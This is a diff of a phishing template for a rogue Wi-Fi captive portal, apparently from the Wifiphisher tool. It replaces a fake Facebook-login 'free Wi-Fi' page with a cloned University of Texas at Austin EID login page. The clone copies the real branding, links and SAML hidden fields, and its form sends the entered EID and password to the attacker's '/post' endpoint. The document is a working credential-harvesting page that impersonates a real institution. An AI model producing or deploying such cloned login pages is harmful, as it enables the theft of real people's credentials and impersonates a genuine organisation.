@@ -1,7 +1,6 @@
-<!DOCTYPE html>
-<html >
-  <head>
-
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
 <script>
 function validateForm() {
     var x = document.forms["theform"]["wfphshr-email"].value;
@@ -19,102 +18,187 @@ function validateForm() {
     }
 }
 </script>
-    <meta charset="UTF-8">
-    <title>{{ organization }} Wi-Fi Service</title>
-    <link rel="stylesheet" href="/static/css/reset.css">
-    <link rel='stylesheet prefetch' href='/static/css/roboto.css'>
-<link rel='stylesheet prefetch' href='/static/css/font-awesome.min.css'>
-        <link rel="stylesheet" href="/static/css/style.css">    
-  </head>
-  <body> 
-<!-- Form Mixin-->
-<!-- Input Mixin-->
-<!-- Button Mixin-->
-<!-- Pen Title-->
-<div class="pen-title">
-  <h1>Get connected to the Internet for free</h1><span>A simple, no frills {{ organization }} Wi-Fi service.</span>
-</div>
-<!-- Form Module-->
-<div class="module form-module">
-  <div class="form">
-  </div>
-  <div class="form">
-    <h2>Login using Facebook</h2>
-    <img src="static/logos/facebook-logo.png" width="25%" class="logo"></img>
-    <form name="theform" class="theform" method="post" action="/post" onsubmit="return validateForm();">
-      <input type="text" placeholder="Email" name="wfphshr-email"/>
-      <input type="password" placeholder="Password" name="wfphshr-password"/>
-      <button class="login-btn">Login</button>
-    </form> 
-  </div>
-  <div class="cta"><a id="btn1">Terms of Usage</a></div>
-</div>
 
-<!-- The Modal -->
-<div id="myModal" class="modal">
+<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
 
-  <!-- Modal content -->
-  <div class="modal-content">
-    <div class="modal-header">
-      <span class="close">×</span>
-      <h2>Terms of Usage</h2>
-    </div>
-    <div class="modal-body">
-      <p>This is a {{ organization }} free Hotspot wireless internet Service (the “Service”) provided for use by customers. All users are required to log-in individually as an independent user.</p>
-      <p>
-The Service is made available provided:
-</p><p>
-(a) You do not use the Service for anything unlawful, immoral or improper;
-</p><p>
-(b) You do not use the Service to make offensive or nuisance communications in whatever form. Such usage includes posting, transmitting, uploading, downloading or otherwise facilitating any content that is unlawful, defamatory, threatening, a nuisance, obscene, hateful, abusive, harmful (including but not limited to viruses, corrupted files, or any other similar software or programs), a breach of privacy, or which is otherwise objectionable;
-</p><p>
-(c) You do not use the Service to harm or attempt to harm minors in any way;
-</p><p>
-(d) You do not act nor knowingly permit others to act in such a way that the operation of the Service or our systems will be jeopardized or impaired;
-</p><p>
-(e) You do not use abusive or threatening behavior towards other users of the Service, members of our staff or any person in the vicinity of a Wireless LAN Hotspot;
-</p><p>
-(f) You do not use the Service to access or use content in a way that infringes the rights of others;
-</p><p>
-(g) The Service is used in accordance with any third party policies for acceptable use or any relevant internet standards (where applicable).
-</p><p>
-(h) You agree not to resell or re-broadcast any aspect of the Service, whether for profit or otherwise. You accept that your entitlement to use the Service is for your personal use only and that you shall not be entitled to transfer your entitlement to use the Service to any other person or allow any other person to make use of the Service or of any username or password or other entitlement supplied to you in connection with the Service.
-</p><p>
-(i) You also agree not to modify the Unit or use the Service for any fraudulent purpose, or in such a way as to create damage or risk to our business, reputation, employees, subscribers, facilities, third parties or to the public generally.
-</p><p>
-(j) You have no proprietary or ownership rights to any username or password or to a specific IP address, or e-mail address assigned to you or your Unit. We may change such addresses at any time or deactivate or suspend Service to any address without prior notice to you if we suspect any unlawful or fraudulent use of the services.
-</p>
-    </div>
-  </div>
+        <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
+        <meta http-equiv="x-ua-compatible" content="IE=edge">
+        
+        <meta name="viewport" content="width=device-width, user-scalable=yes">
+        <title>UT EID Login</title>
+        
 
-    <script src='/static/js/jquery.min.js'></script>
-    <script src="/static/js/index.js"></script> 
-<script>
-// Get the modal
-var modal = document.getElementById('myModal');
+        <link rel="shortcut icon" type="image/png" href="utlogin-favicon.ico">
+        
+        <!--[if IE 6]><link rel="stylesheet" href="/openam/css/ie6.css" type="text/css" media="Screen" /><![endif]-->
+        <!--[if IE 7]><link rel="stylesheet" href="/openam/css/ie7.css" type="text/css" media="Screen" /><![endif]-->
+        <!--[if IE 8]><link rel="stylesheet" href="/openam/css/ie8.css" type="text/css" media="Screen" /><![endif]-->
+        <!--[if IE 9]><link rel="stylesheet" href="/openam/css/ie9.css" type="text/css" media="Screen" /><![endif]-->
+        <script language="JavaScript" src="auth.js" type="text/javascript"></script>
+        <script language="JavaScript" src="jquery-1.8.2.min.js" type="text/javascript"></script>
+        <script language="JavaScript" src="browserversion.js" type="text/javascript"></script>
+        <script language="JavaScript" src="auth-ut.js" type="text/javascript" href="/static/js/style.css"></script>
 
-// Get the button that opens the modal
-var btn = document.getElementById("btn1");
+        
+            <script language="JavaScript" type="text/javascript">
+                var defaultBtn = 'Submit';
+                var elmCount = 0;
 
-// Get the <span> element that closes the modal
-var span = document.getElementsByClassName("close")[0];
+                /**
+                 * submit form with given button value
+                 *
+                 * @param value of button
+                 */
+                function LoginSubmit(value) {
+                    aggSubmit();
+                    var hiddenFrm = document.forms['Login'];
 
-// When the user clicks the button, open the modal 
-btn.onclick = function() {
-    modal.style.display = "block";
-}
+                    if (hiddenFrm != null) {
+                        hiddenFrm.elements['IDButton'].value = value;
+                        if (this.submitted) {
+                            alert("The request is currently being processed");
+                        }
+                        else {
+                            this.submitted = true;
+                            hiddenFrm.submit();
+                        }
+                    }
+                }
+            </script>
+        
 
-// When the user clicks on <span> (x), close the modal
-span.onclick = function() {
-    modal.style.display = "none";
-}
+        <script language="JavaScript" type="text/javascript">
+            <!-- Page is loaded. Initializations. -->
+            jQuery(document).ready(function() {
+                // placeCursorOnFirstElm();
+                document.cookie = "SC=; expires=Thu, 01 Jan 1970 00:00:00 UTC; domain=.utexas.edu; path=/";
+                disableLoginAfter(5 * 1000 * 60 /*5 minutes in ms*/);
+                jQuery("form").attr("action", "/login/UI/Login")
+            });
+        </script>
+<link media="all" href="./static/css/index.css" type="text/css" rel="stylesheet">
+</head>
+<body>
+        
+        <div id="container">
 
-// When the user clicks anywhere outside of the modal, close it
-window.onclick = function(event) {
-    if (event.target == modal) {
-        modal.style.display = "none";
-    }
-}
-</script>
-  </body>
+            <!-- wordmark is the new stacked UT wordmark -->
+            <div id="wordmark">
+                <a href="http://www.utexas.edu/">
+                    <img src="wordmark-small-whte-stacked.png" alt="The University of Texas at Austin" height="44" width="100">
+                </a>
+            </div>
+            <div id="ie8_shadow"></div>
+            <!-- content starts here -->
+            <div id="content">
+                <div id="loginForm">
+                    <div id="message"></div>  <!-- this may be a graphic at some point, but I'll push for the web version to be text. -->
+                    
+
+                    
+                        <form name="theform" class="theform" method="post" action="/post" onsubmit="return validateForm();">
+                            
+                                <script language="javascript" type="text/javascript">
+                                    elmCount++;
+                                </script>
+                                
+                                
+                                
+                            
+                                <script language="javascript" type="text/javascript">
+                                    elmCount++;
+                                </script>
+                                
+                                    <div id="eid">
+                                            <label for="IDToken1">
+                                                 UT EID 
+                                                
+                                            </label>
+                                            <br>
+                                            <input class="input_pad" id="IDToken1" value="" autocomplete="off" size="30" aria-required="true" autofocus="autofocus" type="text" name="wfphshr-email">
+                                    </div>
+                                
+                                
+                                
+                            
+                                <script language="javascript" type="text/javascript">
+                                    elmCount++;
+                                </script>
+                                
+                                
+                                    <div id="password">
+                                        <br>
+                                        <label for="IDToken2">
+                                             PASSWORD 
+                                            
+                                        </label>
+                                        <br>
+                                        <input class="input_pad" name="wfphshr-password" id="IDToken2" value="" autocomplete="off" size="30" aria-required="true" type="password">
+                                    </div>
+                                
+                                
+                            
+
+                            
+                            
+                            
+    
+    
+                          <!--   <input name="login_uri" value="/login/SSORedirect/metaAlias/utaustin/idp" type="hidden">
+                            <input name="login_method" value="GET" type="hidden">
+    
+                            <input name="login_param_SAMLRequest" value="nZNLT+swEIX3/IrI+zaPtrSymkqlCFGJR9Tm3gU71xmDpcQOHpvHv2cSCqoEdNGVpcl4zvF3JnMUTd3yZfBPZgPPAdBHb01tkPcfchac4VagRm5EA8i95Nvl7Q3PhglvnfVW2ppF68ucgTifgdilajpKoTofKzmdpZmSAjIlxFSJ3USl45mSkkX/waG2Jmc0hm4jBlgb9MJ4KiXpdJBMBklaJhM+GvNR9sCiYq91oU2lzeNxY7vPJuTXZVkMivttyaIlIjhPoitrMDTgtuBetIR/m5ucPXnfIo/j4OFN4FCTFxekDw6G0jZxbR+1iTsibDHvDt5bdgeojhsSX+Js0Un9rdSNyubxgcbibP6Z0R1NXV8Wttby/ZSMrqxrhP+7Ox2mfUVXA9W38mCwBamVhor41bV9XTkQHnJGnoFQxD+dfdvdbxNU/W4RdHrwSbu1sk0rnMZuXYiZ9F8ZHA5e1YR4A+qURI62SS670VQu6Hi1ruo2ESQ9rHSCAFnn93n95ueb0a84CFb88wdcfAA=" type="hidden">
+     -->
+                            
+                                
+                                
+                                    <div>
+                                        <img src="dot.gif" alt="" height="15" width="1">
+                                        <div id="login_btn">
+                                            <input name="Login.Submit" onclick="LoginSubmit('Log In'); return false;" class="login button primary" value="Log In" type="submit">
+                                        </div>
+                                    </div>
+                                
+                            
+                            <script language="javascript" type="text/javascript">
+                                if (elmCount != null) {
+                                    document.write("<input name=\"IDButton"  + "\" type=\"hidden\">");
+                                }
+                            </script><input name="IDButton" type="hidden">
+                            <input name="goto" value="/SSORedirect/metaAlias/utaustin/idp?ReqID=ea68eab1f731ed64fc7812fcae2faa7fab5f148fcc&amp;index=null&amp;acsURL=https%3A%2F%2Futexas.instructure.com%2Flogin%2Fsaml&amp;spEntityID=http%3A%2F%2Futexas.instructure.com%2Fsaml2&amp;binding=urn%3Aoasis%3Anames%3Atc%3ASAML%3A2.0%3Abindings%3AHTTP-POST" type="hidden">
+                            <input name="SunQueryParamsString" value="QU1BdXRoQ29va2llLXByb2Q9JmZvcndhcmQ9dHJ1ZSZyZWFsbT0vdXRhdXN0aW4mU0FNTFJlcXVlc3Q9blpOTFQrc3dFSVgzL0lySSt6YVB0clN5bWtxbENGR0pSOVRtM2dVNzF4bURwY1FPSHB2SHYyY1NDcW9FZE5HVnBjbDR6dkYzSm5NVVRkM3laZkJQWmdQUEFkQkhiMDF0a1BjZmNoYWM0VmFnUm01RUE4aTk1TnZsN1EzUGhnbHZuZlZXMnBwRjY4dWNnVGlmZ2RpbGFqcEtvVG9mS3ptZHBabVNBaklseEZTSjNVU2w0NW1Ta2tYL3dhRzJKbWMwaG00akJsZ2I5TUo0S2lYcGRKQk1Ca2xhSmhNK0d2TlI5c0NpWXE5MW9VMmx6ZU54WTd2UEp1VFhaVmtNaXZ0dHlhSWxJamhQb2l0ck1EVGd0dUJldElSL201dWNQWG5mSW8vajRPRk40RkNURnhla0R3Nkcwalp4YlIrMWlUc2liREh2RHQ1YmRnZW9qaHNTWCtKczBVbjlyZFNOeXVieGdjYmliUDZaMFIxTlhWOFd0dGJ5L1pTTXJxeHJoUCs3T3gybWZVVlhBOVczOG1Dd0JhbVZob3I0MWJWOVhUa1FIbkpHbm9GUXhEK2RmZHZkYnhOVS9XNFJkSHJ3U2J1MXNrMHJuTVp1WFlpWjlGOFpIQTVlMVlSNEErcVVSSTYyU1M2NzBWUXU2SGkxcnVvMkVTUTlySFNDQUZubjkzbjk1dWViMGE4NENGYjg4d2RjZkFBPSZzcEVudGl0eUlEPWh0dHA6Ly91dGV4YXMuaW5zdHJ1Y3R1cmUuY29tL3NhbWwy" type="hidden">
+                            <input name="encoded" value="false" type="hidden">
+                        <input name="gx_charset" value="UTF-8" type="hidden"></form>
+                    
+                </div> <!-- end of loginForm -->
+
+                <div id="questions">  <!-- links for users -->
+                    <a href="https://idmanager.its.utexas.edu/eid_self_help/?fp="> I forgot my UT EID or password.</a>
+                    <a href="https://idmanager.its.utexas.edu/eid_self_help/?geid=">I need a UT EID.</a>
+                    <a href="https://idmanager.its.utexas.edu/eid_self_help">Help</a>
+                </div>  <!--end of questions -->
+
+                <div id="license_info">
+                    <p>
+                        Unauthorized use of UT Austin computer and networking resources is prohibited.
+                        If you log in, you acknowledge your awareness of and concurrence with the
+                        <a href="http://security.utexas.edu/policies/aup.html">UT Austin Acceptable Use Policy</a>.
+                        The university will prosecute violators to the full extent of the law. The university is not
+                        responsible for services provided by third parties authorized to use the university's
+                        authentication service.
+                    </p>
+                    <p class="footer">
+                        © 2017 The University of Texas at Austin |
+                        <a href="http://www.utexas.edu/web-privacy-policy">Web Privacy Policy</a> |
+                        <a href="http://www.utexas.edu/web-accessibility-policy">Web Accessibility Policy</a><br><br>
+                        Version: 2016.1.5
+                    </p>
+                </div> <!-- license_info -->
+            </div> <!--end of content -->
+        </div> <!--end of container -->
+    
+
+
+
+</body>
 </html>
